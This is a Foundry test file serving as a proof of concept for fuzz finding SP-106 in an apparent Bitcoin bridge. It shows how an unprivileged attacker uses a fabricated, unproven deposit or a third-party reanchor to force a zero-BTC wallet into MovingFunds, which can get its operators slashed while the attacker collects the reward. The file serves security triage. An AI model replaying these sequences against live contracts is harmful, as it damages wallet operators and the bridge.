// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// PoC for fuzz lead SP-106 "wallet entered MovingFunds without a main UTXO or
// proven anchors" (solidity/fizz_data/triage/SP106.verdict.md; Foundry repro
// test_repro_property_walletMovesNeedBtcOrProvenAnchors in
// solidity/test/fizz/FoundryTester.sol:70-80). The fuzzer reached the end
// state only through a governance-privileged reanchor. This file asks which
// routes reach the same end state for an UNPRIVILEGED caller.
//
// End state under test: a wallet that was Live is now MovingFunds while
// wallet.mainUtxoHash == 0 (zero BTC) and no reservation is anchored at it
// (reservations(key).walletPubKeyHash never equals the wallet).
//
// Source lines involved (solidity/contracts/bridge):
//   Wallets.sol:607-639      moveFunds: mainUtxoHash == 0 && count == 0 goes to
//                            Closing; any non-zero count goes to MovingFunds
//                            (decrements liveWalletsCount, unsets the active
//                            wallet if it was the active one)
//   Wallets.sol:323-351      notifyWalletCloseable: permissionless, rejects the
//                            active wallet, zero balance passes the
//                            "too few satoshis" check
//   Reservation.sol:488-639  requestReservationAcceptance: depositor only,
//                            reserveAcceptanceCapacity (948) does count += 1
//                            with no Bitcoin proof
//   Reservation.sol:723-859  requestReservationReanchor: Live source needs
//                            governance (749-753), MovingFunds or Closing
//                            source is open to anyone (754-759); the target
//                            count is bumped at request time (820)
//   Reservation.sol:861-915  notifyReservationActionTimeout (releases the
//                            target count, 982)
//   Reservation.sol:656-692  notifyReservationAcceptanceTimedOut
//   Deposit.sol:198-420      _revealDeposit: needs only a Live wallet and a
//                            well formed script; no SPV proof of the funding tx
//   MovingFunds.sol:164-262  submitMovingFundsCommitment (balance > 0 at 211)
//   MovingFunds.sol:567-588  notifyMovingFundsTimeout (slash, Terminated)
//   MovingFunds.sol:603-624  notifyMovingFundsBelowDust (free exit to Closing)
//   Wallets.sol:360-387      notifyWalletClosingPeriodElapsed (needs count 0)
//   Wallets.sol:286-306      notifyWalletHeartbeatFailed (registry only)
//
// Parameters (test/fizz/Base.sol): moving funds timeout 3 days, slashing 100 T,
// notifier reward multiplier 100, action timeout 1 day, closing period 2 days,
// reservation min 10_000 sat, tx max fee 1_000 sat. Bridge.sol:329-331 defaults
// are 7 days, 100 T, 100.
//
// Every test PASSES when the behaviour described in its name is observed.

import {Test} from "forge-std/Test.sol";
import {Handlers} from "../fizz/handlers/Handlers.sol";
import {BtcBuilder} from "../fizz/utils/BtcBuilder.sol";
import {BitcoinTx} from "../../contracts/bridge/BitcoinTx.sol";
import {Deposit} from "../../contracts/bridge/Deposit.sol";
import {Reservation} from "../../contracts/bridge/Reservation.sol";
import {Wallets} from "../../contracts/bridge/Wallets.sol";

contract SP106PermissionlessMovingFunds is Test, Handlers {
    modifier asActor() override {
        vm.startPrank(actor);
        _;
        vm.stopPrank();
    }

    string internal constant ERR_ACTIVE =
        "Active wallet cannot be considered closeable";
    string internal constant ERR_LIVE_NEEDS_GOV =
        "Only governance can rotate a Live wallet's anchor";
    string internal constant ERR_NOT_DEPOSITOR =
        "Caller is not the deposit's depositor";
    string internal constant ERR_NOT_REGISTRY =
        "Caller is not the ECDSA Wallet Registry";
    string internal constant ERR_ZERO_BALANCE = "Wallet BTC balance is zero";
    string internal constant ERR_STILL_CUSTODIES =
        "Wallet still custodies reservations";

    uint64 internal constant DEPOSIT_SAT = 50_000;

    address internal attacker;
    address internal bystander;
    bytes20 internal w0;
    bytes20 internal w1;
    bytes20 internal w2;
    uint256 internal sp106Salt;

    function setUp() public {
        setup();
        attacker = makeAddr("sp106.attacker");
        bystander = makeAddr("sp106.bystander");
        w0 = _sp106Pkh(0);
        w1 = _sp106Pkh(1);
        w2 = _sp106Pkh(2);
        // setup() registers wallet 0 and makes it the active wallet.
        assertEq(bridge.activeWalletPubKeyHash(), w0, "w0 starts active");
    }

    // ------------------------------------------------------------------
    // Control: the original behaviour (no reservation custody)
    // ------------------------------------------------------------------

    /// @notice Without any reservation count, a zero-BTC non-active Live
    ///         wallet goes straight to Closing (Wallets.sol:613-620) and no
    ///         operator is slashed. This is the behaviour the count gate
    ///         changes.
    function test_SP106_control_zeroBalanceWalletWithoutCountGoesStraightToClosing()
        public
    {
        _registerWalletFromKey(1); // w1 becomes active, w0 is superseded
        assertEq(uint256(reservationRouter.walletReservationsCount(w0)), 0);
        assertEq(uint256(bridge.liveWalletsCount()), 2);

        vm.prank(bystander);
        bridge.notifyWalletCloseable(w0, _none());

        Wallets.Wallet memory w = bridge.wallets(w0);
        _assertStateOf(w, Wallets.WalletState.Closing);
        assertEq(uint256(w.closingStartedAt), block.timestamp);
        assertEq(uint256(w.movingFundsRequestedAt), 0, "never entered MovingFunds");
        assertEq(w.mainUtxoHash, bytes32(0));
        assertEq(uint256(bridge.liveWalletsCount()), 1);
        assertEq(walletRegistry.seizeCalls(), 0, "Closing is not slashable");
    }

    // ------------------------------------------------------------------
    // Route A: depositor acceptance request with a fabricated deposit
    // ------------------------------------------------------------------

    /// @notice REACHABLE without any role. An account with no Bank balance,
    ///         no TBTC and no privileges reveals a fabricated reserved
    ///         deposit for the superseded zero-BTC wallet (no Bitcoin proof is
    ///         checked at reveal), requests acceptance (count 0 -> 1, nothing
    ///         proven) and anyone then calls notifyWalletCloseable. The wallet
    ///         ends MovingFunds with no main UTXO and no anchor.
    function test_SP106_routeA_fakeDepositAcceptanceRequestPushesWalletToMovingFunds()
        public
    {
        _registerWalletFromKey(1); // w0 superseded, w1 active
        assertEq(bank.balanceOf(attacker), 0);
        assertEq(tbtc.balanceOf(attacker), 0);
        uint256 liveBefore = bridge.liveWalletsCount();

        (uint256 key, , ) = _sp106Reveal(attacker, w0, DEPOSIT_SAT);
        _sp106RequestAcceptance(attacker, key, w0);

        // The only thing backing the count is a pending authorization.
        assertEq(uint256(reservationRouter.walletReservationsCount(w0)), 1);
        Reservation.ReservationRequest memory r = reservationRouter
            .reservations(key);
        assertEq(uint256(uint8(r.state)), uint256(uint8(Reservation.ReservationState.Unknown)));
        assertEq(r.walletPubKeyHash, bytes20(0), "no anchor anywhere");
        Reservation.ReservationAction memory a = reservationRouter
            .reservationActions(key, r.requestNonce);
        assertEq(uint256(uint8(a.actionType)), uint256(uint8(Reservation.ActionType.Acceptance)));
        assertEq(uint256(uint8(a.state)), uint256(uint8(Reservation.ActionState.Pending)));
        assertEq(bridge.wallets(w0).mainUtxoHash, bytes32(0));
        assertTrue(bridge.activeWalletPubKeyHash() != w0);

        vm.prank(bystander); // any third party
        bridge.notifyWalletCloseable(w0, _none());

        Wallets.Wallet memory w = bridge.wallets(w0);
        _assertStateOf(w, Wallets.WalletState.MovingFunds);
        assertEq(uint256(w.movingFundsRequestedAt), block.timestamp);
        assertEq(uint256(w.closingStartedAt), 0, "skipped Closing");
        assertEq(w.mainUtxoHash, bytes32(0), "still no main UTXO");
        assertEq(uint256(bridge.liveWalletsCount()), liveBefore - 1);
        assertEq(
            reservationRouter.reservations(key).walletPubKeyHash,
            bytes20(0),
            "still no proven anchor at w0"
        );
        assertEq(walletRegistry.seizeCalls(), 0, "no slash yet");
    }

    /// @notice Consequence 1: a MovingFunds wallet with no BTC cannot do what
    ///         the state asks. The commitment step (the first move step) is
    ///         impossible (MovingFunds.sol:211).
    function test_SP106_routeA_consequence_walletCannotCommitAMove() public {
        _sp106PushViaFakeDeposit();

        uint32[] memory ids = new uint32[](0);
        bytes20[] memory targets = new bytes20[](1);
        targets[0] = w1;
        vm.expectRevert(bytes(ERR_ZERO_BALANCE));
        bridge.submitMovingFundsCommitment(w0, _none(), ids, 0, targets);
    }

    /// @notice Consequence 2: if nobody reports BelowDust within
    ///         movingFundsTimeout, the wallet operators are slashed and the
    ///         wallet is Terminated, and the reward goes to whoever reports,
    ///         here the attacker.
    function test_SP106_routeA_consequence_timeoutSlashesOperatorsAndPaysAttacker()
        public
    {
        _sp106PushViaFakeDeposit();
        uint32 requestedAt = bridge.wallets(w0).movingFundsRequestedAt;

        // Exactly at the boundary the report is still premature.
        vm.warp(uint256(requestedAt) + MOVING_FUNDS_TIMEOUT);
        uint32[] memory ids = new uint32[](0);
        vm.expectRevert(bytes("Moving funds has not timed out yet"));
        vm.prank(attacker);
        bridge.notifyMovingFundsTimeout(w0, ids);

        vm.warp(uint256(requestedAt) + MOVING_FUNDS_TIMEOUT + 1);
        vm.prank(attacker);
        bridge.notifyMovingFundsTimeout(w0, ids);

        _assertState(w0, Wallets.WalletState.Terminated);
        assertEq(walletRegistry.seizeCalls(), 1);
        assertEq(walletRegistry.lastSeizeNotifier(), attacker);
        assertEq(
            walletRegistry.totalSeizeRequested(),
            uint256(MOVING_FUNDS_TIMEOUT_SLASHING_AMOUNT) *
                MOVING_FUNDS_TIMEOUT_NOTIFIER_REWARD_MULTIPLIER
        );
        assertEq(walletRegistry.lastSeizeWalletID(), bridge.wallets(w0).ecdsaWalletID);
        // terminateWallet also closes the wallet in the registry (Wallets.sol:709).
        assertEq(walletRegistry.closeWalletCalls(), 1);
    }

    /// @notice Mitigation check: BelowDust is permissionless and free for a
    ///         zero-BTC wallet, moves it to Closing with no slash, and the
    ///         wallet cannot finish closing until the fake pending
    ///         authorization is reported as timed out (also permissionless).
    function test_SP106_routeA_exit_belowDustAvoidsSlashAndClosingFinishesAfterAcceptanceTimeout()
        public
    {
        (uint256 key, ) = _sp106PushViaFakeDeposit();

        vm.prank(bystander);
        bridge.notifyMovingFundsBelowDust(w0, _none());
        Wallets.Wallet memory w = bridge.wallets(w0);
        _assertStateOf(w, Wallets.WalletState.Closing);
        assertEq(walletRegistry.seizeCalls(), 0, "no slash on the exit");

        vm.warp(uint256(w.closingStartedAt) + 2 days + 1);
        vm.expectRevert(bytes(ERR_STILL_CUSTODIES));
        bridge.notifyWalletClosingPeriodElapsed(w0);

        vm.prank(bystander);
        reservationRouter.notifyReservationAcceptanceTimedOut(key);
        assertEq(uint256(reservationRouter.walletReservationsCount(w0)), 0);

        bridge.notifyWalletClosingPeriodElapsed(w0);
        _assertState(w0, Wallets.WalletState.Closed);
        assertEq(walletRegistry.closeWalletCalls(), 1);
    }

    /// @notice The attacker's count is only needed for the single
    ///         notifyWalletCloseable call. Once the authorization is reported
    ///         timed out the count is 0 again but the wallet stays in
    ///         MovingFunds: the transition is not undone.
    function test_SP106_routeA_stateIsNotRevertedWhenCountIsReleased() public {
        (uint256 key, ) = _sp106PushViaFakeDeposit();
        Reservation.ReservationRequest memory r = reservationRouter
            .reservations(key);
        Reservation.ReservationAction memory a = reservationRouter
            .reservationActions(key, r.requestNonce);

        vm.warp(uint256(a.timeoutAt));
        vm.prank(bystander);
        reservationRouter.notifyReservationAcceptanceTimedOut(key);

        assertEq(uint256(reservationRouter.walletReservationsCount(w0)), 0);
        _assertState(w0, Wallets.WalletState.MovingFunds, "count released, MovingFunds stays");
    }

    /// @notice Pre-positioning variant: the attacker files the fake
    ///         authorization while w0 is still the active wallet. While w0 is
    ///         active notifyWalletCloseable rejects it (NOT REACHABLE then);
    ///         as soon as another wallet is registered and w0 is superseded,
    ///         the same count lets anyone push it, with no further attacker
    ///         action.
    function test_SP106_routeA_prepositionOnActiveWalletThenRotation() public {
        assertEq(bridge.activeWalletPubKeyHash(), w0);
        (uint256 key, , ) = _sp106Reveal(attacker, w0, DEPOSIT_SAT);
        _sp106RequestAcceptance(attacker, key, w0);
        assertEq(uint256(reservationRouter.walletReservationsCount(w0)), 1);

        vm.expectRevert(bytes(ERR_ACTIVE));
        bridge.notifyWalletCloseable(w0, _none());
        _assertState(w0, Wallets.WalletState.Live);

        _registerWalletFromKey(1); // DKG for a new wallet completes
        assertEq(uint256(reservationRouter.walletReservationsCount(w0)), 1);

        bridge.notifyWalletCloseable(w0, _none());
        _assertState(w0, Wallets.WalletState.MovingFunds);
        assertEq(bridge.wallets(w0).mainUtxoHash, bytes32(0));
    }

    // ------------------------------------------------------------------
    // Route B: third-party reanchor from a MovingFunds source
    // ------------------------------------------------------------------

    /// @notice REACHABLE without any role, but it needs a legitimately proven
    ///         reservation anchored at a wallet that is already MovingFunds
    ///         (normal retirement of a wallet holding reservations). Anyone may
    ///         then pick any Live target, here a zero-BTC non-active wallet,
    ///         whose count rises to 1 at request time. One notifyWalletCloseable
    ///         later the target is MovingFunds with no main UTXO and no anchor.
    function test_SP106_routeB_thirdPartyReanchorLoadsTargetThenTargetIsPushed()
        public
    {
        // Honest reservation, really anchored at w0 (active at the time).
        uint256 key = _sp106HonestAccept(actors[0], w0, DEPOSIT_SAT, 0);
        assertEq(
            uint256(uint8(reservationRouter.reservations(key).state)),
            uint256(uint8(Reservation.ReservationState.Active))
        );
        assertEq(reservationRouter.reservations(key).walletPubKeyHash, w0);

        _registerWalletFromKey(1);
        _registerWalletFromKey(2); // w2 active; w0 and w1 superseded
        assertEq(bridge.activeWalletPubKeyHash(), w2);
        assertEq(uint256(bridge.liveWalletsCount()), 3);

        // Legitimate retirement of w0: it holds a proven anchor, so the count
        // gate sends it to MovingFunds (the design intent, Wallets.sol:604-606).
        vm.prank(bystander);
        bridge.notifyWalletCloseable(w0, _none());
        _assertState(w0, Wallets.WalletState.MovingFunds);

        // Target w1: Live, not active, no BTC, no reservations.
        assertEq(uint256(reservationRouter.walletReservationsCount(w1)), 0);
        assertEq(bridge.wallets(w1).mainUtxoHash, bytes32(0));

        // Unprivileged reanchor request (msg.sender != governance).
        vm.prank(attacker);
        reservationRouter.requestReservationReanchor(key, w1);

        Reservation.ReservationRequest memory r = reservationRouter
            .reservations(key);
        assertEq(uint256(uint8(r.state)), uint256(uint8(Reservation.ReservationState.ActionPending)));
        assertEq(r.walletPubKeyHash, w0, "anchor is still at w0");
        assertEq(uint256(reservationRouter.walletReservationsCount(w1)), 1);
        _assertState(w1, Wallets.WalletState.Live);

        vm.prank(bystander);
        bridge.notifyWalletCloseable(w1, _none());

        Wallets.Wallet memory w = bridge.wallets(w1);
        _assertStateOf(w, Wallets.WalletState.MovingFunds);
        assertEq(w.mainUtxoHash, bytes32(0));
        assertEq(uint256(w.closingStartedAt), 0);
        assertEq(
            reservationRouter.reservations(key).walletPubKeyHash,
            w0,
            "no anchor at w1"
        );
        assertEq(uint256(bridge.liveWalletsCount()), 1, "only w2 remains Live");
        assertEq(bridge.activeWalletPubKeyHash(), w2);

        // Same lasting effect as route A: after the pending reanchor times out
        // the count is released but w1 stays MovingFunds, and w1 cannot commit
        // a move because it holds no BTC.
        Reservation.ReservationAction memory a = reservationRouter
            .reservationActions(key, r.requestNonce);
        vm.warp(uint256(a.timeoutAt));
        reservationRouter.notifyReservationActionTimeout(key);
        assertEq(uint256(reservationRouter.walletReservationsCount(w1)), 0);
        _assertState(w1, Wallets.WalletState.MovingFunds);

        uint32[] memory ids = new uint32[](0);
        bytes20[] memory targets = new bytes20[](1);
        targets[0] = w2;
        vm.expectRevert(bytes(ERR_ZERO_BALANCE));
        bridge.submitMovingFundsCommitment(w1, _none(), ids, 0, targets);
    }

    // ------------------------------------------------------------------
    // Route C: Live-source reanchor (the route the fuzzer used)
    // ------------------------------------------------------------------

    /// @notice PRIVILEGED only. Reproduces the fuzzer sequence with named
    ///         roles: governance rotates an anchor away from a Live wallet to
    ///         a zero-BTC target, and the target is then pushed by anyone.
    function test_SP106_routeC_governanceReanchorFromLiveSourceReproducesFuzzerState()
        public
    {
        uint256 key = _sp106HonestAccept(actors[0], w0, DEPOSIT_SAT, 0);
        _registerWalletFromKey(1);
        _registerWalletFromKey(2);
        _assertState(w0, Wallets.WalletState.Live, "source wallet is Live");

        vm.prank(governance);
        reservationRouter.requestReservationReanchor(key, w1);
        assertEq(uint256(reservationRouter.walletReservationsCount(w1)), 1);
        assertEq(reservationRouter.reservations(key).walletPubKeyHash, w0);

        vm.prank(bystander);
        bridge.notifyWalletCloseable(w1, _none());
        _assertState(w1, Wallets.WalletState.MovingFunds);
        assertEq(bridge.wallets(w1).mainUtxoHash, bytes32(0));
    }

    /// @notice NOT REACHABLE for an unprivileged caller: the same reanchor
    ///         request from a non-governance account reverts while the source
    ///         wallet is Live (Reservation.sol:749-753), and w1 is not loaded.
    function test_SP106_routeC_nonGovernanceReanchorFromLiveSourceReverts()
        public
    {
        uint256 key = _sp106HonestAccept(actors[0], w0, DEPOSIT_SAT, 0);
        _registerWalletFromKey(1);
        _registerWalletFromKey(2);

        vm.expectRevert(bytes(ERR_LIVE_NEEDS_GOV));
        vm.prank(attacker);
        reservationRouter.requestReservationReanchor(key, w1);

        assertEq(uint256(reservationRouter.walletReservationsCount(w1)), 0);
        // With count 0 the same call that pushed w1 to MovingFunds in the
        // other tests sends it to Closing instead.
        bridge.notifyWalletCloseable(w1, _none());
        _assertState(w1, Wallets.WalletState.Closing);
    }

    // ------------------------------------------------------------------
    // Routes that do not exist
    // ------------------------------------------------------------------

    /// @notice NOT REACHABLE: an unprivileged account cannot load a wallet
    ///         using somebody else's revealed deposit (Reservation.sol:500-503).
    ///         (It does not need to: route A uses the caller's own fabricated
    ///         deposit.)
    function test_SP106_notReachable_nonDepositorCannotRequestAcceptance()
        public
    {
        _registerWalletFromKey(1);
        (uint256 key, , ) = _sp106Reveal(actors[0], w0, DEPOSIT_SAT);

        vm.expectRevert(bytes(ERR_NOT_DEPOSITOR));
        vm.prank(attacker);
        reservationRouter.requestReservationAcceptance(key, w0);
        assertEq(uint256(reservationRouter.walletReservationsCount(w0)), 0);
    }

    /// @notice NOT REACHABLE: the heartbeat-failure route into moveFunds
    ///         (Wallets.sol:305) is registry only.
    function test_SP106_notReachable_heartbeatFailureCallbackIsRegistryOnly()
        public
    {
        _registerWalletFromKey(1);
        vm.expectRevert(bytes(ERR_NOT_REGISTRY));
        vm.prank(attacker);
        bridge.__ecdsaWalletHeartbeatFailedCallback(
            bytes32(0),
            walletPubX[0],
            walletPubY[0]
        );
        _assertState(w0, Wallets.WalletState.Live);
    }

    /// @notice NOT REACHABLE: a wallet that is the active wallet cannot be
    ///         pushed even with a load on it (Wallets.sol:328-331).
    function test_SP106_notReachable_activeWalletCannotBePushed() public {
        (uint256 key, , ) = _sp106Reveal(attacker, w0, DEPOSIT_SAT);
        _sp106RequestAcceptance(attacker, key, w0);
        vm.expectRevert(bytes(ERR_ACTIVE));
        bridge.notifyWalletCloseable(w0, _none());
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    /// @dev Fabricated reserved deposit plus acceptance request by an
    ///      unprivileged account, then the permissionless push of w0.
    function _sp106PushViaFakeDeposit()
        internal
        returns (uint256 key, uint64 nonce)
    {
        _registerWalletFromKey(1); // w0 superseded, w1 active
        (key, , ) = _sp106Reveal(attacker, w0, DEPOSIT_SAT);
        _sp106RequestAcceptance(attacker, key, w0);
        nonce = reservationRouter.reservations(key).requestNonce;
        vm.prank(bystander);
        bridge.notifyWalletCloseable(w0, _none());
        _assertState(w0, Wallets.WalletState.MovingFunds);
    }

    /// @dev Reveals a reserved deposit of `depositor` for `wallet`. The
    ///      funding transaction is fabricated: nothing is proven on Bitcoin.
    function _sp106Reveal(address depositor, bytes20 wallet, uint64 amount)
        internal
        returns (
            uint256 key,
            BitcoinTx.Info memory fundingTx,
            uint32 outputIndex
        )
    {
        uint256 salt = ++sp106Salt;
        Deposit.DepositRevealInfo memory reveal = Deposit.DepositRevealInfo({
            fundingOutputIndex: 0,
            blindingFactor: bytes8(keccak256(abi.encode(salt, "blinding"))),
            walletPubKeyHash: wallet,
            refundPubKeyHash: bytes20(
                keccak256(abi.encode(salt, depositor, "refund"))
            ),
            refundLocktime: _sp106Le32(uint32(block.timestamp + 3 days)),
            vault: address(reservationVault)
        });
        (fundingTx, outputIndex) = BtcBuilder.depositFundingTx(
            reveal,
            depositor,
            bytes32(0),
            false,
            true,
            amount,
            keccak256(abi.encode("sp106.funding", salt))
        );
        key = uint256(
            keccak256(
                abi.encodePacked(BtcBuilder.txHash(fundingTx), outputIndex)
            )
        );
        vm.startPrank(depositor);
        bridge.revealDeposit(fundingTx, reveal);
        vm.stopPrank();
    }

    function _sp106RequestAcceptance(
        address depositor,
        uint256 key,
        bytes20 wallet
    ) internal {
        vm.prank(depositor);
        reservationRouter.requestReservationAcceptance(key, wallet);
    }

    /// @dev Full honest acceptance: reveal, request, wallet anchor tx proven
    ///      by the SPV maintainer. Leaves an Active reservation at `wallet`.
    function _sp106HonestAccept(
        address depositor,
        bytes20 wallet,
        uint64 amount,
        uint64 fee
    ) internal returns (uint256 key) {
        BitcoinTx.Info memory fundingTx;
        uint32 outputIndex;
        (key, fundingTx, outputIndex) = _sp106Reveal(depositor, wallet, amount);
        _sp106RequestAcceptance(depositor, key, wallet);

        uint64 nonce = reservationRouter.reservations(key).requestNonce;
        BitcoinTx.Info memory anchorTx = _sp106SingleOutputTx(
            BtcBuilder.txHash(fundingTx),
            outputIndex,
            amount - fee,
            wallet
        );
        BitcoinTx.Proof memory proof = BtcBuilder.prove(anchorTx, 1);
        vm.startPrank(spvMaintainer);
        reservationRouter.submitReservationAcceptanceProof(
            anchorTx,
            proof,
            key,
            nonce
        );
        vm.stopPrank();
    }

    function _sp106SingleOutputTx(
        bytes32 prevTxHash,
        uint32 prevOutIndex,
        uint64 value,
        bytes20 walletPkh
    ) internal pure returns (BitcoinTx.Info memory) {
        BtcBuilder.TxIn[] memory ins = new BtcBuilder.TxIn[](1);
        ins[0] = BtcBuilder.TxIn({
            prevTxHash: prevTxHash,
            prevOutIndex: prevOutIndex
        });
        BtcBuilder.TxOut[] memory outs = new BtcBuilder.TxOut[](1);
        outs[0] = BtcBuilder.TxOut({
            value: value,
            script: BtcBuilder.p2wpkh(walletPkh)
        });
        return BtcBuilder.buildTx(ins, outs);
    }

    function _sp106Pkh(uint256 keyIndex) internal view returns (bytes20) {
        return BtcBuilder.pubKeyHash(walletPubX[keyIndex], walletPubY[keyIndex]);
    }

    function _sp106Le32(uint32 v) internal pure returns (bytes4) {
        return
            bytes4(
                (v << 24) | ((v & 0xff00) << 8) | ((v >> 8) & 0xff00) | (v >> 24)
            );
    }

    function _assertState(bytes20 wallet, Wallets.WalletState expected)
        internal
    {
        _assertState(wallet, expected, "wallet state");
    }

    function _assertState(
        bytes20 wallet,
        Wallets.WalletState expected,
        string memory message
    ) internal {
        assertEq(
            uint256(uint8(bridge.wallets(wallet).state)),
            uint256(uint8(expected)),
            message
        );
    }

    function _assertStateOf(Wallets.Wallet memory w, Wallets.WalletState expected)
        internal
    {
        assertEq(uint256(uint8(w.state)), uint256(uint8(expected)), "wallet state");
    }

    function _none() internal pure returns (BitcoinTx.UTXO memory) {
        return BitcoinTx.UTXO(bytes32(0), 0, 0);
    }
}
